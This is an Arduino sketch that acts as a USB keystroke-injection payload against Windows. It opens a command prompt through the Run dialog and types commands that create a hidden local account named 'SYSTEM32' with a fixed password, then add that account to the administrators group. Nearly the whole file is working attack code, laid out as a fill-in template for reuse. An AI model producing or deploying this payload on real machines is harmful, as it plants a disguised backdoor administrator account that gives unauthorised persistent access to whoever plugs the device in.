#include <Keyboard.h>

void setup() {

	/*
	Start cli prompt here
	Use delay to fix problems
	*/

	Keyboard.begin();
	delay(1000);

	Keyboard.press(KEY_LEFT_GUI);
	delay(50);

	Keyboard.press('r');
	delay(50);

	Keyboard.releaseAll();
	delay(50);

	Keyboard.print("cmd");
	delay(50);

	Keyboard.press(KEY_RETURN);
	delay(50);

	Keyboard.releaseAll();
	delay(50);

	/*
	Your code here
	Use delay to fix problems
	*/

	delay(1000);

	Keyboard.print("net user /add SYSTEM32 rubberduino");
	delay(50);
	Keyboard.press(KEY_RETURN);
	Keyboard.releaseAll();
	
	Keyboard.print("net localgroup administrators SYSTEM32 /add");
	delay(50);
	Keyboard.press(KEY_RETURN);
	Keyboard.releaseAll();

}

void loop() {
	

}
